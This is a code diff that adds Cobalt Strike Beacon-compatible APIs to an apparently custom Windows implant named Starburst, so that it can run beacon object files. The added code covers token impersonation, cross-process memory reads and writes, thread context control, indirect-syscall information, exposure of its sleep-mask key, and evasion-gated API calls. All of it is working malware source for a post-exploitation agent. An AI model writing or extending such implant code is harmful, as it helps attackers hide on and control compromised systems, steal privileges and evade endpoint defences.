@@ -4,67 +4,130 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <coff.h>
+#include <module.h>
 
 #ifdef INCLUDE_CMD_EXECUTE_COFF
 
 using namespace stardust;
 using namespace starburst;
 
-// COFF structures
-#pragma pack(push, 1)
-struct COFF_FILE_HEADER {
-    uint16_t Machine;
-    uint16_t NumberOfSections;
-    uint32_t TimeDateStamp;
-    uint32_t PointerToSymbolTable;
-    uint32_t NumberOfSymbols;
-    uint16_t SizeOfOptionalHeader;
-    uint16_t Characteristics;
+// ── BOF-VS Beacon API compatibility types ──
+// These mirror beacon.h struct layouts for BeaconInformation / BeaconGetSyscallInformation
+
+#define BOF_CALLBACK_OUTPUT      0x0
+#define BOF_CALLBACK_ERROR       0x0d
+#define BOF_MASK_SIZE            13
+
+struct bof_heap_record {
+    char*  ptr;
+    size_t size;
 };
 
-struct COFF_SECTION {
-    char     Name[8];
-    uint32_t VirtualSize;
-    uint32_t VirtualAddress;
-    uint32_t SizeOfRawData;
-    uint32_t PointerToRawData;
-    uint32_t PointerToRelocations;
-    uint32_t PointerToLinenumbers;
-    uint16_t NumberOfRelocations;
-    uint16_t NumberOfLinenumbers;
-    uint32_t Characteristics;
+struct bof_alloc_section {
+    int     Label;
+    PVOID   BaseAddress;
+    SIZE_T  VirtualSize;
+    DWORD   CurrentProtect;
+    DWORD   PreviousProtect;
+    BOOL    MaskSection;
+    DWORD   DripLoadPageSize;
 };
 
-struct COFF_SYMBOL {
-    union {
-        char     ShortName[8];
-        struct {
-            uint32_t Zeroes;
-            uint32_t Offset;
-        } Name;
-    };
-    uint32_t Value;
-    int16_t  SectionNumber;
-    uint16_t Type;
-    uint8_t  StorageClass;
-    uint8_t  NumberOfAuxSymbols;
+struct bof_alloc_cleanup {
+    BOOL      Cleanup;
+    int       AllocationMethod;
+    uint8_t   AdditionalInfo[16];
 };
 
-struct COFF_RELOCATION {
-    uint32_t VirtualAddress;
-    uint32_t SymbolTableIndex;
-    uint16_t Type;
+struct bof_alloc_region {
+    int                Purpose;
+    PVOID              AllocationBase;
+    SIZE_T             RegionSize;
+    DWORD              Type;
+    DWORD              DripLoadAllocationGranularity;
+    bof_alloc_section  Sections[8];
+    bof_alloc_cleanup  CleanupInformation;
 };
-#pragma pack(pop)
 
-#define IMAGE_REL_AMD64_ADDR64   0x0001
-#define IMAGE_REL_AMD64_ADDR32NB 0x0003
-#define IMAGE_REL_AMD64_REL32    0x0004
-#define IMAGE_REL_AMD64_REL32_1  0x0005
-#define IMAGE_REL_AMD64_REL32_2  0x0006
-#define IMAGE_REL_AMD64_REL32_3  0x0007
-#define IMAGE_REL_AMD64_REL32_4  0x0008
-#define IMAGE_REL_AMD64_REL32_5  0x0009
+struct bof_alloc_memory {
+    bof_alloc_region AllocatedMemoryRegions[6];
+};
+
+struct bof_beacon_info {
+    unsigned int       version;
+    char*              sleep_mask_ptr;
+    DWORD              sleep_mask_text_size;
+    DWORD              sleep_mask_total_size;
+    char*              beacon_ptr;
+    bof_heap_record*   heap_records;
+    char               mask[BOF_MASK_SIZE];
+    bof_alloc_memory   allocatedMemory;
+};
+
+struct bof_syscall_entry {
+    PVOID fnAddr;
+    PVOID jmpAddr;
+    DWORD sysnum;
+};
+
+struct bof_syscall_api {
+    bof_syscall_entry ntAllocateVirtualMemory;
+    bof_syscall_entry ntProtectVirtualMemory;
+    bof_syscall_entry ntFreeVirtualMemory;
+    bof_syscall_entry ntGetContextThread;
+    bof_syscall_entry ntSetContextThread;
+    bof_syscall_entry ntResumeThread;
+    bof_syscall_entry ntCreateThreadEx;
+    bof_syscall_entry ntOpenProcess;
+    bof_syscall_entry ntOpenThread;
+    bof_syscall_entry ntClose;
+    bof_syscall_entry ntCreateSection;
+    bof_syscall_entry ntMapViewOfSection;
+    bof_syscall_entry ntUnmapViewOfSection;
+    bof_syscall_entry ntQueryVirtualMemory;
+    bof_syscall_entry ntDuplicateObject;
+    bof_syscall_entry ntReadVirtualMemory;
+    bof_syscall_entry ntWriteVirtualMemory;
+    bof_syscall_entry ntReadFile;
+    bof_syscall_entry ntWriteFile;
+    bof_syscall_entry ntCreateFile;
+    bof_syscall_entry ntQueueApcThread;
+    bof_syscall_entry ntCreateProcess;
+    bof_syscall_entry ntOpenProcessToken;
+    bof_syscall_entry ntTestAlert;
+    bof_syscall_entry ntSuspendProcess;
+    bof_syscall_entry ntResumeProcess;
+    bof_syscall_entry ntQuerySystemInformation;
+    bof_syscall_entry ntQueryDirectoryFile;
+    bof_syscall_entry ntSetInformationProcess;
+    bof_syscall_entry ntSetInformationThread;
+    bof_syscall_entry ntQueryInformationProcess;
+    bof_syscall_entry ntQueryInformationThread;
+    bof_syscall_entry ntOpenSection;
+    bof_syscall_entry ntAdjustPrivilegesToken;
+    bof_syscall_entry ntDeviceIoControlFile;
+    bof_syscall_entry ntWaitForMultipleObjects;
+};
+
+struct bof_rtl_api {
+    PVOID rtlDosPathNameToNtPathNameUWithStatusAddr;
+    PVOID rtlFreeHeapAddr;
+    PVOID rtlGetProcessHeapAddr;
+};
+
+struct bof_beacon_syscalls {
+    bof_syscall_api syscalls;
+    bof_rtl_api     rtls;
+};
+
+struct bof_data_store_object {
+    int     type;
+    DWORD64 hash;
+    BOOL    masked;
+    char*   buffer;
+    size_t  length;
+};
 
 // TEB.ArbitraryUserPointer at gs:0x28
 // Use raw .byte encoding for gs segment access to avoid Intel/AT&T syntax issues
@@ -286,6 +349,469 @@ static void __cdecl declfn beacon_cleanup_thread( void* ctx ) {
     (void)ctx;
 }
 
+// ── Data API ──
+
+static char* __cdecl declfn beacon_data_ptr( datap* dp, int size ) {
+    if ( !dp || dp->length < size ) return nullptr;
+    char* result = dp->buffer;
+    dp->buffer += size;
+    dp->length -= size;
+    return result;
+}
+
+// ── Output: file download ──
+
+static BOOL __cdecl declfn beacon_download( const char* filename, const char* buffer, unsigned int length ) {
+    auto inst = coff_get_inst();
+    if ( !inst || !filename || !buffer || length == 0 ) return FALSE;
+    beacon_printf( 0, "[download] %s (%u bytes received by BOF)\n", filename, length );
+    return TRUE;
+}
+
+// ── Token functions ──
+
+static BOOL __cdecl declfn beacon_use_token( HANDLE token ) {
+    auto inst = coff_get_inst();
+    if ( !inst || !token || token == INVALID_HANDLE_VALUE ) return FALSE;
+    if ( inst->advapi32.ImpersonateLoggedOnUser( token ) ) {
+        inst->agent.impersonated_token = token;
+        return TRUE;
+    }
+    return FALSE;
+}
+
+static void __cdecl declfn beacon_revert_token() {
+    auto inst = coff_get_inst();
+    if ( !inst ) return;
+    inst->advapi32.RevertToSelf();
+    inst->agent.impersonated_token = nullptr;
+}
+
+// ── Spawn+Inject (stubs) ──
+
+static void __cdecl declfn beacon_inject_process(
+    HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len
+) {
+    (void)hProc; (void)pid; (void)payload; (void)p_len; (void)p_offset; (void)arg; (void)a_len;
+    beacon_printf( 0, "[error] BeaconInjectProcess not yet supported\n" );
+}
+
+static void __cdecl declfn beacon_inject_temp_process(
+    PROCESS_INFORMATION* pInfo, char* payload, int p_len, int p_offset, char* arg, int a_len
+) {
+    (void)pInfo; (void)payload; (void)p_len; (void)p_offset; (void)arg; (void)a_len;
+    beacon_printf( 0, "[error] BeaconInjectTemporaryProcess not yet supported\n" );
+}
+
+static BOOL __cdecl declfn beacon_spawn_temp_process(
+    BOOL x86, BOOL ignoreToken, STARTUPINFO* si, PROCESS_INFORMATION* pInfo
+) {
+    (void)x86; (void)ignoreToken; (void)si; (void)pInfo;
+    beacon_printf( 0, "[error] BeaconSpawnTemporaryProcess not yet supported\n" );
+    return FALSE;
+}
+
+// ── Utility ──
+
+static BOOL __cdecl declfn beacon_to_wide_char( char* src, wchar_t* dst, int max ) {
+    auto inst = coff_get_inst();
+    if ( !inst || !src || !dst || max <= 0 ) return FALSE;
+    int result = inst->kernel32.MultiByteToWideChar( 0 /*CP_ACP*/, 0, src, -1, dst, max );
+    return result > 0 ? TRUE : FALSE;
+}
+
+// ── Beacon Information ──
+
+static BOOL __cdecl declfn beacon_information( bof_beacon_info* info ) {
+    auto inst = coff_get_inst();
+    if ( !inst || !info ) return FALSE;
+
+    memory::zero( info, sizeof( bof_beacon_info ) );
+
+    info->version = 0x041200;
+    info->sleep_mask_ptr = nullptr;
+    info->sleep_mask_text_size = 0;
+    info->sleep_mask_total_size = 0;
+
+    if ( inst->evasion.ekko.initialized ) {
+        info->beacon_ptr = reinterpret_cast<char*>( inst->evasion.ekko.img_base );
+        for ( int i = 0; i < BOF_MASK_SIZE && i < 16; i++ )
+            info->mask[i] = static_cast<char>( inst->evasion.ekko.rc4_key[i] );
+    } else {
+        info->beacon_ptr = reinterpret_cast<char*>( inst->base.address );
+        ULONG seed = inst->kernel32.GetTickCount();
+        for ( int i = 0; i < BOF_MASK_SIZE; i++ ) {
+            seed = inst->ntdll.RtlRandomEx( &seed );
+            info->mask[i] = static_cast<char>( seed & 0xFF );
+        }
+    }
+
+    if ( !inst->coff.info_heap_buf ) {
+        inst->coff.info_heap_buf = inst->heap_alloc( sizeof( bof_heap_record ) );
+        if ( inst->coff.info_heap_buf )
+            memory::zero( inst->coff.info_heap_buf, sizeof( bof_heap_record ) );
+    }
+    info->heap_records = reinterpret_cast<bof_heap_record*>( inst->coff.info_heap_buf );
+
+    auto& region = info->allocatedMemory.AllocatedMemoryRegions[0];
+    region.Purpose = 2; /* PURPOSE_BEACON_MEMORY */
+    if ( inst->evasion.ekko.initialized ) {
+        region.AllocationBase = reinterpret_cast<PVOID>( inst->evasion.ekko.img_base );
+        region.RegionSize = inst->evasion.ekko.img_size;
+    } else {
+        region.AllocationBase = reinterpret_cast<PVOID>( inst->base.address );
+        region.RegionSize = inst->base.length;
+    }
+    region.Type = MEM_PRIVATE;
+
+    if ( region.AllocationBase && region.RegionSize > 0 ) {
+        auto& sec = region.Sections[0];
+        sec.Label = 3; /* LABEL_TEXT */
+        sec.BaseAddress = region.AllocationBase;
+        sec.VirtualSize = region.RegionSize;
+        sec.CurrentProtect = PAGE_EXECUTE_READ;
+        sec.MaskSection = TRUE;
+    }
+
+    return TRUE;
+}
+
+// ── Key/Value store ──
+
+static uint32_t declfn _kv_hash( const char* key ) {
+    uint32_t h = 0x811c9dc5;
+    while ( *key ) { h ^= (uint8_t)*key++; h *= 0x01000193; }
+    return h;
+}
+
+static BOOL __cdecl declfn beacon_add_value( const char* key, void* ptr ) {
+    auto inst = coff_get_inst();
+    if ( !inst || !key ) return FALSE;
+    uint32_t h = _kv_hash( key );
+
+    for ( uint32_t i = 0; i < inst->bof_kv.count; i++ ) {
+        if ( inst->bof_kv.entries[i].hash == h ) {
+            inst->bof_kv.entries[i].ptr = ptr;
+            return TRUE;
+        }
+    }
+
+    if ( inst->bof_kv.count >= 32 ) return FALSE;
+    inst->bof_kv.entries[inst->bof_kv.count].hash = h;
+    inst->bof_kv.entries[inst->bof_kv.count].ptr = ptr;
+    inst->bof_kv.count++;
+    return TRUE;
+}
+
+static void* __cdecl declfn beacon_get_value( const char* key ) {
+    auto inst = coff_get_inst();
+    if ( !inst || !key ) return nullptr;
+    uint32_t h = _kv_hash( key );
+    for ( uint32_t i = 0; i < inst->bof_kv.count; i++ ) {
+        if ( inst->bof_kv.entries[i].hash == h )
+            return inst->bof_kv.entries[i].ptr;
+    }
+    return nullptr;
+}
+
+static BOOL __cdecl declfn beacon_remove_value( const char* key ) {
+    auto inst = coff_get_inst();
+    if ( !inst || !key ) return FALSE;
+    uint32_t h = _kv_hash( key );
+    for ( uint32_t i = 0; i < inst->bof_kv.count; i++ ) {
+        if ( inst->bof_kv.entries[i].hash == h ) {
+            for ( uint32_t j = i; j + 1 < inst->bof_kv.count; j++ )
+                inst->bof_kv.entries[j] = inst->bof_kv.entries[j + 1];
+            inst->bof_kv.count--;
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+
+// ── Data Store (stubs — Starburst doesn't have a data store yet) ──
+
+static bof_data_store_object* __cdecl declfn beacon_data_store_get_item( size_t ) {
+    return nullptr;
+}
+
+static void __cdecl declfn beacon_data_store_protect_item( size_t ) {}
+static void __cdecl declfn beacon_data_store_unprotect_item( size_t ) {}
+
+static size_t __cdecl declfn beacon_data_store_max_entries() {
+    return 0;
+}
+
+// ── Custom User Data ──
+
+static char* __cdecl declfn beacon_get_custom_user_data() {
+    auto inst = coff_get_inst();
+    if ( !inst ) return nullptr;
+    return reinterpret_cast<char*>( inst->evasion.udrl_user_data );
+}
+
+// ── Syscall Information ──
+
+static BOOL __cdecl declfn beacon_get_syscall_info(
+    bof_beacon_syscalls* info, SIZE_T infoSize, BOOL
+) {
+    auto inst = coff_get_inst();
+    if ( !inst || !info || infoSize < sizeof( bof_beacon_syscalls ) ) return FALSE;
+
+    memory::zero( info, sizeof( bof_beacon_syscalls ) );
+
+    auto& st = inst->evasion;
+    auto fill_entry = [&]( bof_syscall_entry& dst, uint32_t api_hash ) {
+        for ( uint32_t i = 0; i < st.syscall_count; i++ ) {
+            if ( st.syscall_table[i].hash == api_hash ) {
+                dst.sysnum  = st.syscall_table[i].ssn;
+                dst.jmpAddr = st.syscall_table[i].trampoline;
+                dst.fnAddr  = (PVOID)resolve::_api( inst->ntdll.handle, api_hash );
+                return;
+            }
+        }
+        dst.fnAddr = (PVOID)resolve::_api( inst->ntdll.handle, api_hash );
+    };
+
+    fill_entry( info->syscalls.ntAllocateVirtualMemory,  expr::hash_string( "NtAllocateVirtualMemory" ) );
+    fill_entry( info->syscalls.ntProtectVirtualMemory,   expr::hash_string( "NtProtectVirtualMemory" ) );
+    fill_entry( info->syscalls.ntFreeVirtualMemory,      expr::hash_string( "NtFreeVirtualMemory" ) );
+    fill_entry( info->syscalls.ntGetContextThread,       expr::hash_string( "NtGetContextThread" ) );
+    fill_entry( info->syscalls.ntSetContextThread,       expr::hash_string( "NtSetContextThread" ) );
+    fill_entry( info->syscalls.ntResumeThread,           expr::hash_string( "NtResumeThread" ) );
+    fill_entry( info->syscalls.ntCreateThreadEx,         expr::hash_string( "NtCreateThreadEx" ) );
+    fill_entry( info->syscalls.ntOpenProcess,            expr::hash_string( "NtOpenProcess" ) );
+    fill_entry( info->syscalls.ntOpenThread,             expr::hash_string( "NtOpenThread" ) );
+    fill_entry( info->syscalls.ntClose,                  expr::hash_string( "NtClose" ) );
+    fill_entry( info->syscalls.ntCreateSection,          expr::hash_string( "NtCreateSection" ) );
+    fill_entry( info->syscalls.ntMapViewOfSection,       expr::hash_string( "NtMapViewOfSection" ) );
+    fill_entry( info->syscalls.ntUnmapViewOfSection,     expr::hash_string( "NtUnmapViewOfSection" ) );
+    fill_entry( info->syscalls.ntQueryVirtualMemory,     expr::hash_string( "NtQueryVirtualMemory" ) );
+    fill_entry( info->syscalls.ntDuplicateObject,        expr::hash_string( "NtDuplicateObject" ) );
+    fill_entry( info->syscalls.ntReadVirtualMemory,      expr::hash_string( "NtReadVirtualMemory" ) );
+    fill_entry( info->syscalls.ntWriteVirtualMemory,     expr::hash_string( "NtWriteVirtualMemory" ) );
+    fill_entry( info->syscalls.ntQuerySystemInformation,  expr::hash_string( "NtQuerySystemInformation" ) );
+
+    info->rtls.rtlFreeHeapAddr       = (PVOID)resolve::_api( inst->ntdll.handle, expr::hash_string( "RtlFreeHeap" ) );
+    info->rtls.rtlGetProcessHeapAddr = (PVOID)resolve::_api( inst->ntdll.handle, expr::hash_string( "RtlGetProcessHeap" ) );
+
+    return TRUE;
+}
+
+// ── System call wrapper functions (pass-through to real WinAPIs) ──
+
+static LPVOID __cdecl declfn beacon_virtual_alloc(
+    LPVOID addr, SIZE_T size, DWORD type, DWORD prot
+) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return nullptr;
+    if ( inst->evasion.beacon_gate_enabled && inst->evasion.sleepmask_vs.loaded ) {
+        ULONG_PTR a[4] = {
+            reinterpret_cast<ULONG_PTR>( addr ), static_cast<ULONG_PTR>( size ),
+            static_cast<ULONG_PTR>( type ), static_cast<ULONG_PTR>( prot )
+        };
+        return reinterpret_cast<LPVOID>(
+            evasion_beacon_gate_call( *inst, (void*)inst->kernel32.VirtualAlloc,
+                2 /*VIRTUALALLOC*/, 4, a, inst->evasion.beacon_gate_masking ) );
+    }
+    return inst->kernel32.VirtualAlloc( addr, size, type, prot );
+}
+
+static LPVOID __cdecl declfn beacon_virtual_alloc_ex(
+    HANDLE proc, LPVOID addr, SIZE_T size, DWORD type, DWORD prot
+) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return nullptr;
+    typedef LPVOID (WINAPI *fn_t)( HANDLE, LPVOID, SIZE_T, DWORD, DWORD );
+    auto fn = reinterpret_cast<fn_t>(
+        resolve::_api( inst->kernel32.handle, expr::hash_string( "VirtualAllocEx" ) ) );
+    return fn ? fn( proc, addr, size, type, prot ) : nullptr;
+}
+
+static BOOL __cdecl declfn beacon_virtual_protect(
+    LPVOID addr, SIZE_T size, DWORD prot, PDWORD old_prot
+) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return FALSE;
+    if ( inst->evasion.beacon_gate_enabled && inst->evasion.sleepmask_vs.loaded ) {
+        ULONG_PTR a[4] = {
+            reinterpret_cast<ULONG_PTR>( addr ), static_cast<ULONG_PTR>( size ),
+            static_cast<ULONG_PTR>( prot ), reinterpret_cast<ULONG_PTR>( old_prot )
+        };
+        return static_cast<BOOL>(
+            evasion_beacon_gate_call( *inst, (void*)inst->kernel32.VirtualProtect,
+                4 /*VIRTUALPROTECT*/, 4, a, inst->evasion.beacon_gate_masking ) );
+    }
+    return inst->kernel32.VirtualProtect( addr, size, prot, old_prot );
+}
+
+static BOOL __cdecl declfn beacon_virtual_protect_ex(
+    HANDLE proc, LPVOID addr, SIZE_T size, DWORD prot, PDWORD old_prot
+) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return FALSE;
+    typedef BOOL (WINAPI *fn_t)( HANDLE, LPVOID, SIZE_T, DWORD, PDWORD );
+    auto fn = reinterpret_cast<fn_t>(
+        resolve::_api( inst->kernel32.handle, expr::hash_string( "VirtualProtectEx" ) ) );
+    return fn ? fn( proc, addr, size, prot, old_prot ) : FALSE;
+}
+
+static BOOL __cdecl declfn beacon_virtual_free(
+    LPVOID addr, SIZE_T size, DWORD type
+) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return FALSE;
+    if ( inst->evasion.beacon_gate_enabled && inst->evasion.sleepmask_vs.loaded ) {
+        ULONG_PTR a[3] = {
+            reinterpret_cast<ULONG_PTR>( addr ), static_cast<ULONG_PTR>( size ),
+            static_cast<ULONG_PTR>( type )
+        };
+        return static_cast<BOOL>(
+            evasion_beacon_gate_call( *inst, (void*)inst->kernel32.VirtualFree,
+                6 /*VIRTUALFREE*/, 3, a, inst->evasion.beacon_gate_masking ) );
+    }
+    return inst->kernel32.VirtualFree( addr, size, type );
+}
+
+static BOOL __cdecl declfn beacon_get_thread_context( HANDLE thread, PCONTEXT ctx ) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return FALSE;
+    typedef BOOL (WINAPI *fn_t)( HANDLE, PCONTEXT );
+    auto fn = reinterpret_cast<fn_t>(
+        resolve::_api( inst->kernel32.handle, expr::hash_string( "GetThreadContext" ) ) );
+    return fn ? fn( thread, ctx ) : FALSE;
+}
+
+static BOOL __cdecl declfn beacon_set_thread_context( HANDLE thread, PCONTEXT ctx ) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return FALSE;
+    typedef BOOL (WINAPI *fn_t)( HANDLE, PCONTEXT );
+    auto fn = reinterpret_cast<fn_t>(
+        resolve::_api( inst->kernel32.handle, expr::hash_string( "SetThreadContext" ) ) );
+    return fn ? fn( thread, ctx ) : FALSE;
+}
+
+static DWORD __cdecl declfn beacon_resume_thread( HANDLE thread ) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return (DWORD)-1;
+    typedef DWORD (WINAPI *fn_t)( HANDLE );
+    auto fn = reinterpret_cast<fn_t>(
+        resolve::_api( inst->kernel32.handle, expr::hash_string( "ResumeThread" ) ) );
+    return fn ? fn( thread ) : (DWORD)-1;
+}
+
+static HANDLE __cdecl declfn beacon_open_process( DWORD access, BOOL inherit, DWORD pid ) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return nullptr;
+    if ( inst->evasion.beacon_gate_enabled && inst->evasion.sleepmask_vs.loaded ) {
+        ULONG_PTR a[3] = {
+            static_cast<ULONG_PTR>( access ), static_cast<ULONG_PTR>( inherit ),
+            static_cast<ULONG_PTR>( pid )
+        };
+        return reinterpret_cast<HANDLE>(
+            evasion_beacon_gate_call( *inst, (void*)inst->kernel32.OpenProcess,
+                12 /*OPENPROCESS*/, 3, a, inst->evasion.beacon_gate_masking ) );
+    }
+    return inst->kernel32.OpenProcess( access, inherit, pid );
+}
+
+static HANDLE __cdecl declfn beacon_open_thread( DWORD access, BOOL inherit, DWORD tid ) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return nullptr;
+    typedef HANDLE (WINAPI *fn_t)( DWORD, BOOL, DWORD );
+    auto fn = reinterpret_cast<fn_t>(
+        resolve::_api( inst->kernel32.handle, expr::hash_string( "OpenThread" ) ) );
+    return fn ? fn( access, inherit, tid ) : nullptr;
+}
+
+static BOOL __cdecl declfn beacon_close_handle( HANDLE h ) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return FALSE;
+    if ( inst->evasion.beacon_gate_enabled && inst->evasion.sleepmask_vs.loaded ) {
+        ULONG_PTR a[1] = { reinterpret_cast<ULONG_PTR>( h ) };
+        return static_cast<BOOL>(
+            evasion_beacon_gate_call( *inst, (void*)inst->kernel32.CloseHandle,
+                14 /*CLOSEHANDLE*/, 1, a, inst->evasion.beacon_gate_masking ) );
+    }
+    return inst->kernel32.CloseHandle( h );
+}
+
+static BOOL __cdecl declfn beacon_unmap_view_of_file( LPCVOID addr ) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return FALSE;
+    typedef BOOL (WINAPI *fn_t)( LPCVOID );
+    auto fn = reinterpret_cast<fn_t>(
+        resolve::_api( inst->kernel32.handle, expr::hash_string( "UnmapViewOfFile" ) ) );
+    return fn ? fn( addr ) : FALSE;
+}
+
+static SIZE_T __cdecl declfn beacon_virtual_query(
+    LPCVOID addr, PMEMORY_BASIC_INFORMATION mbi, SIZE_T len
+) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return 0;
+    typedef SIZE_T (WINAPI *fn_t)( LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T );
+    auto fn = reinterpret_cast<fn_t>(
+        resolve::_api( inst->kernel32.handle, expr::hash_string( "VirtualQuery" ) ) );
+    return fn ? fn( addr, mbi, len ) : 0;
+}
+
+static BOOL __cdecl declfn beacon_duplicate_handle(
+    HANDLE src_proc, HANDLE src_handle, HANDLE dst_proc, LPHANDLE dst_handle,
+    DWORD access, BOOL inherit, DWORD opts
+) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return FALSE;
+    typedef BOOL (WINAPI *fn_t)( HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD );
+    auto fn = reinterpret_cast<fn_t>(
+        resolve::_api( inst->kernel32.handle, expr::hash_string( "DuplicateHandle" ) ) );
+    return fn ? fn( src_proc, src_handle, dst_proc, dst_handle, access, inherit, opts ) : FALSE;
+}
+
+static BOOL __cdecl declfn beacon_read_process_memory(
+    HANDLE proc, LPCVOID addr, LPVOID buf, SIZE_T size, SIZE_T* bytes_read
+) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return FALSE;
+    typedef BOOL (WINAPI *fn_t)( HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T* );
+    auto fn = reinterpret_cast<fn_t>(
+        resolve::_api( inst->kernel32.handle, expr::hash_string( "ReadProcessMemory" ) ) );
+    return fn ? fn( proc, addr, buf, size, bytes_read ) : FALSE;
+}
+
+static BOOL __cdecl declfn beacon_write_process_memory(
+    HANDLE proc, LPVOID addr, LPCVOID buf, SIZE_T size, SIZE_T* bytes_written
+) {
+    auto inst = coff_get_inst();
+    if ( !inst ) return FALSE;
+    typedef BOOL (WINAPI *fn_t)( HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T* );
+    auto fn = reinterpret_cast<fn_t>(
+        resolve::_api( inst->kernel32.handle, expr::hash_string( "WriteProcessMemory" ) ) );
+    return fn ? fn( proc, addr, buf, size, bytes_written ) : FALSE;
+}
+
+// ── BeaconGate toggles (stored in instance for future sleepmask-vs integration) ──
+
+static void __cdecl declfn beacon_disable_gate() {
+    auto inst = coff_get_inst();
+    if ( inst ) inst->evasion.beacon_gate_enabled = false;
+}
+
+static void __cdecl declfn beacon_enable_gate() {
+    auto inst = coff_get_inst();
+    if ( inst ) inst->evasion.beacon_gate_enabled = true;
+}
+
+static void __cdecl declfn beacon_disable_gate_masking() {
+    auto inst = coff_get_inst();
+    if ( inst ) inst->evasion.beacon_gate_masking = false;
+}
+
+static void __cdecl declfn beacon_enable_gate_masking() {
+    auto inst = coff_get_inst();
+    if ( inst ) inst->evasion.beacon_gate_masking = true;
+}
+
 } // extern "C"
 
 // read current thread ID from TEB
@@ -392,6 +918,44 @@ static auto declfn resolve_coff_symbol(
         case _fnv1a("BeaconIsAdmin"):          return (void*)beacon_is_admin;
         case _fnv1a("BeaconGetSpawnTo"):       return (void*)beacon_get_spawn_to;
         case _fnv1a("BeaconCleanupProcess"):   return (void*)beacon_cleanup_thread;
+        case _fnv1a("BeaconDataPtr"):          return (void*)beacon_data_ptr;
+        case _fnv1a("BeaconDownload"):         return (void*)beacon_download;
+        case _fnv1a("BeaconUseToken"):         return (void*)beacon_use_token;
+        case _fnv1a("BeaconRevertToken"):      return (void*)beacon_revert_token;
+        case _fnv1a("BeaconInjectProcess"):    return (void*)beacon_inject_process;
+        case _fnv1a("BeaconInjectTemporaryProcess"): return (void*)beacon_inject_temp_process;
+        case _fnv1a("BeaconSpawnTemporaryProcess"):  return (void*)beacon_spawn_temp_process;
+        case _fnv1a("toWideChar"):             return (void*)beacon_to_wide_char;
+        case _fnv1a("BeaconInformation"):      return (void*)beacon_information;
+        case _fnv1a("BeaconAddValue"):         return (void*)beacon_add_value;
+        case _fnv1a("BeaconGetValue"):         return (void*)beacon_get_value;
+        case _fnv1a("BeaconRemoveValue"):      return (void*)beacon_remove_value;
+        case _fnv1a("BeaconDataStoreGetItem"):       return (void*)beacon_data_store_get_item;
+        case _fnv1a("BeaconDataStoreProtectItem"):   return (void*)beacon_data_store_protect_item;
+        case _fnv1a("BeaconDataStoreUnprotectItem"): return (void*)beacon_data_store_unprotect_item;
+        case _fnv1a("BeaconDataStoreMaxEntries"):    return (void*)beacon_data_store_max_entries;
+        case _fnv1a("BeaconGetCustomUserData"):      return (void*)beacon_get_custom_user_data;
+        case _fnv1a("BeaconGetSyscallInformation"):  return (void*)beacon_get_syscall_info;
+        case _fnv1a("BeaconVirtualAlloc"):     return (void*)beacon_virtual_alloc;
+        case _fnv1a("BeaconVirtualAllocEx"):   return (void*)beacon_virtual_alloc_ex;
+        case _fnv1a("BeaconVirtualProtect"):   return (void*)beacon_virtual_protect;
+        case _fnv1a("BeaconVirtualProtectEx"): return (void*)beacon_virtual_protect_ex;
+        case _fnv1a("BeaconVirtualFree"):      return (void*)beacon_virtual_free;
+        case _fnv1a("BeaconGetThreadContext"):  return (void*)beacon_get_thread_context;
+        case _fnv1a("BeaconSetThreadContext"):  return (void*)beacon_set_thread_context;
+        case _fnv1a("BeaconResumeThread"):      return (void*)beacon_resume_thread;
+        case _fnv1a("BeaconOpenProcess"):       return (void*)beacon_open_process;
+        case _fnv1a("BeaconOpenThread"):        return (void*)beacon_open_thread;
+        case _fnv1a("BeaconCloseHandle"):       return (void*)beacon_close_handle;
+        case _fnv1a("BeaconUnmapViewOfFile"):   return (void*)beacon_unmap_view_of_file;
+        case _fnv1a("BeaconVirtualQuery"):      return (void*)beacon_virtual_query;
+        case _fnv1a("BeaconDuplicateHandle"):   return (void*)beacon_duplicate_handle;
+        case _fnv1a("BeaconReadProcessMemory"): return (void*)beacon_read_process_memory;
+        case _fnv1a("BeaconWriteProcessMemory"):return (void*)beacon_write_process_memory;
+        case _fnv1a("BeaconDisableBeaconGate"):  return (void*)beacon_disable_gate;
+        case _fnv1a("BeaconEnableBeaconGate"):   return (void*)beacon_enable_gate;
+        case _fnv1a("BeaconDisableMasking"):     return (void*)beacon_disable_gate_masking;
+        case _fnv1a("BeaconEnableMasking"):      return (void*)beacon_enable_gate_masking;
     }
 
     if ( name[0] == '_' && name[1] == '_' && name[2] == 'i' && name[3] == 'm' && name[4] == 'p' && name[5] == '_' ) {
@@ -751,6 +1315,7 @@ auto declfn starburst::cmd_execute_coff(
     }
 
     if ( inst.coff.output_data ) inst.heap_free( inst.coff.output_data );
+    if ( inst.coff.info_heap_buf ) inst.heap_free( inst.coff.info_heap_buf );
     inst.coff = {};
 
     inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
